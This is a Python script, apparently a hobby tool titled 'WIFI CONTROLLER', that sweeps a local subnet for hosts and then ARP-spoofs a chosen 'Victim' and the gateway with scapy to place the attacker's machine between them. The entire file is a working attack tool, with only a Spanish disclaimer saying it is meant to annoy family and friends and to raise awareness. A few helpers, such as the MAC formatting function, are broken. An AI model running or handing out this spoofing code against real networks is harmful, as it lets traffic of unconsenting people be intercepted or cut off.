import os
import platform
import netaddr
from getmac import get_mac_address
import socket
from progress.bar import Bar
from threading import Thread
import time
import struct
import binascii
from scapy.all import ARP, send
import netifaces

USER_MAC=get_mac_address()
COLUMNS=os.get_terminal_size().columns-1
GATEWAY=None

class wifiScanner(Thread):

	def __init__(self, ips):
		Thread.__init__(self)
		self.ips=ips
		self.total=0
		self.res=[]
		self.alive=False

	def run(self):
		global USER_MAC
		global GATEWAY
		self.alive=True
		for ip in self.ips:
			ip=str(ip)
			mac=get_mac_address(ip=ip)
			if mac and mac!=USER_MAC:
				hn=''
				try:
					aux=socket.gethostbyaddr(ip)
					if aux:
						hn=aux[0]
				except:
					pass
				if GATEWAY and ip==GATEWAY:
					GATEWAY=str(mac)+'	'+ip+'	'+str(hn)
				else:
					self.res.append(str(mac)+'	'+ip+'	'+str(hn))
			self.total+=1
		self.alive=False

	def isAlive(self):
		return self.alive

	def getTotal(self):
		return self.total

	def getRes(self):
		res=self.res
		self.res=[]
		return res



class spoofer(Thread):

	def __init__(self, v, g):
		Thread.__init__(self)
		self.v=v.split()
		self.g=g.split()
		self.spoof=True



	def attack(self, v, g):
		global USER_MAC
		victimmac=v[0]
		gatewaymac=g[0]
		gateway_ip=g[1]
		victim_ip=v[1]
		arp_response = ARP(pdst=victim_ip, hwdst=victimmac, psrc=gateway_ip, hwsrc=USER_MAC, op='is-at')
		send(arp_response, verbose=0)



	def restore(self, v, g):
		victimmac=v[0]
		gatewaymac=g[0]
		gateway_ip=g[1]
		victim_ip=v[1]
		arp_response=ARP(pdst=victim_ip, hwdst=victimmac, psrc=gateway_ip, hwsrc=gatewaymac, op='is-at')
		send(arp_response, verbose=0)
		arp_response=ARP(pdst=gateway_ip, hwdst=gatewaymac, psrc=victim_ip, hwsrc=victimmac, op='is-at')
		send(arp_response, verbose=0)



	def run(self):
		while self.spoof:
			self.attack(self.v, self.g)
			self.attack(self.g, self.v)


	def stop(self):
		self.spoof=False



def sortByIP(line):
	return line.split()[1]


def formatMac(mac):
	max=mac.split(':')
	foo='\x00'
	res=''
	for n in mac:
		res+=foo.replace('00', n)
	return res



def printTable(list, ids=True):
	global USER_MAC
	global COLUMNS
	max=len('['+str(len(list))+']')
	res=[]
	for i in range(len(list)):
		n=' 	'
		if ids:
			n=' ['+str(i)+']'
			n=n+' '*(max-len(n))
			n=n+'	'
		res.append(n+list[i])
	print('='*COLUMNS)
	print(' HOSTS')
	print('-'*COLUMNS)
	print('\n'.join(res))
	print('='*COLUMNS)



def validTarget(target, list):
	global USER_MAC
	valid=True
	try:
		target=int(target)
	except:
		valid=False
	if valid:
		valid=(target in range(len(list)) and USER_MAC not in list[target])
	return valid



def validOption(option, list):
	valid=True
	try:
		option=int(option)
	except:
		valid=False
	if valid:
		valid=(option in range(len(list)))
	return valid



def validNet(net):
	valid=('.' in net and '/' in net)
	if valid:
		net=net.split('/')
		valid=(len(net)==2)
		if valid:
			ip,mask=net
			ip=ip.split('.')
			valid=(len(ip)==4)
			if valid:
				for n in ip+[mask]:
					try:
						n=int(n)
					except:
						valid=False
						break
	return valid



def clean():
	sys=platform.system()
	if sys=='Linux':
		os.system('clear')
	elif sys=='Windows':
		os.system('cls')



def getTargets(list):
	global GATEWAY
	done=False
	while not done:
		clean()
		printTitle('START ATTACK')
		printTable(list)
		victim=input('Victim: ')
		while not validTarget(victim, list):
			print('[-] Invalid ID')
			victim=input('Victim: ')
		victim=list[int(victim)]
		gateway=None
		if not GATEWAY or len(GATEWAY.split())==1:
			gateway=input('Gateway: ')
			while not validTarget(gateway, list):
				print('[-] Invalid ID')
				gateway=input('Gateway: ')
			gateway=list[int(gateway)]
		print('='*COLUMNS)
		print(' TARGETS')
		print('-'*COLUMNS)
		print('Victim IP:	'+victim)
		if gateway:
			print('Gateway IP:	'+gateway)
			GATEWAY=gateway
		print('='*COLUMNS)
		aux=input('Is this information correct? [Y/n]: ').lower()
		done=(not aux or aux=='y')
	return victim, GATEWAY



def scanNet():
	global GATEWAY
	try:
		gws=netifaces.gateways()
		GATEWAY=gws['default'][netifaces.AF_INET][0]
	except:
		GATEWAY=None
	try:
		gws=netifaces.gateways()
		GATEWAY=gws['default'][netifaces.AF_INET][0]
	except:
		GATEWAY=None
	clean()
	printTitle('SCAN A NETWORK')
	net=input('Network: ')
	while not validNet(net):
		print('[-] Invalid Network (format: X.X.X.X/Y)')
		net=input('Network: ')
	print('')		
	hosts=list(netaddr.IPNetwork(net))
	maxThreads=50
	size=int(len(hosts)/maxThreads)
	threads=[]
	for i in range(maxThreads):
		if i==maxThreads-1:
			aux=hosts[size*i:]
		else:	
			aux=hosts[size*i:size*(i+1)]
		thread=wifiScanner(aux)
		thread.start()
		threads.append(thread)
	bar=Bar('Scanning',max = len(hosts))
	total=0
	res=[]
	done=False
	while not done:
		now=0
		done=True
		for thread in threads:
			if thread.isAlive():
				done=False
			else:
				res+=thread.getRes()
			now+=thread.getTotal()
		for i in range(now-total):
			bar.next()
		total+=now-total
		time.sleep(0.25)
	res.sort(key=sortByIP)
	return res



def printMenu():
	print('='*COLUMNS)
	print('Options:')
	print('-'*COLUMNS)
	print('[0] Scan a network')
	print('[1] Start attack')
	print('[2] Exit')
	print('='*COLUMNS)



def printDisclaimer():
	res='''	Atención!

	Este programa ha sido creado con la intención de disfrutar fastidiando
	a familiares y amigos, también pretende mostrar y concienciar de la
	facilidad de la que se dispone para realizar ataques en una red privada
	sin necesidad de un gran conocimiento. El autor no se hace responsable
	del mal uso que se le pueda dar a estas líneas de código.

	Happy Hacking :)

	Quino
	'''
	print(res)
	input('  Pulse cualquier tecla para continuar')



def printTitle(title):
	clean()
	print('#'*COLUMNS)
	print(' '+str(title))
	print('#'*COLUMNS)
	print('')



def main():
	option=None
	res=[]
	print_menu=True
	print_title=True
	printTitle('WIFI CONTROLLER')
	printDisclaimer()
	while option!=2:
		if print_title:
			printTitle('WIFI CONTROLLER')
			print_title=False
		if res:
			printTable(res, ids=False)
		if print_menu:
			printMenu()
		print_menu=True
		option=input('Option: ')
		while not validOption(option, range(3)):
			print('[-] Invalid Option')
			input('Option: ')
		option=int(option)
		if option==0:
			print_title=True
			try:
				res=scanNet()
			except KeyboardInterrupt:
				continue
		elif option==1:
			if not res:
				print('[!] First of all you need to scan a network')
				print_menu=False
				print_title=True
				continue
			try:
				victim,gateway=getTargets(res)
			except KeyboardInterrupt:
				print_title=True
				continue
			s=spoofer(victim, gateway)
			s.start()
			print('[!] Starting attack...')
			time.sleep(1)
			s.stop()
			print('[+] Done')
			input('Press any key to continue')
			print_title=True


main()

